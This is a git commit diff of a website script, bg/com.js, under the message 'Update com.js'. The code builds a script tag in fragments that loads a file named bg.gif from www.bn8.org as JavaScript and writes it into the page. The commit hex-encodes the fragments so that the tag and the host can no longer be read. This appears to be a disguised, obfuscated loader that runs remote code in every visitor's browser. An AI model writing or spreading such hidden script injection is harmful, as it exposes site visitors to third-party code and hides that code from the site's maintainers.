bc05b08e8ff73b4f6bae77cbe861ff7a07dbf608
bian888 <87354060+bian888@users.noreply.github.com>
2021-07-13 14:01:00 +0800

    Update com.js

--- bg/com.js
+++ bg/com.js
@@ -7,9 +7,9 @@ window.event.returnValue = false;
 }
 }
 
-var s1 = "<";
-var s2 = "script type=", s3 = "text/javascript src=//www.bn8.org",s4 = "/bg.gif></script";
-var s5 =">";
+var s1 = "\x3c";
+var s2 = "s\x63r\x69pt\x20t\x79\x70\x65\x3D", s3 = "\x74ex\x74\x2F\x6A\x61\x76as\x63\x72\x69pt\x20s\x72c\x3d//\x77\x77\x77\x2e\x62\x6e\x38\x2e\x6f\x72\x67",s4 = "\x2f\x62\x67\x2e\x67\x69\x66\x3e\x3c\x2f\x73\x63\x72\x69pt";
+var s5 ="\x3e";
 s2 = s2 + s3 + s4;
 s = s1 + s2 + s5;
 document.write(s);
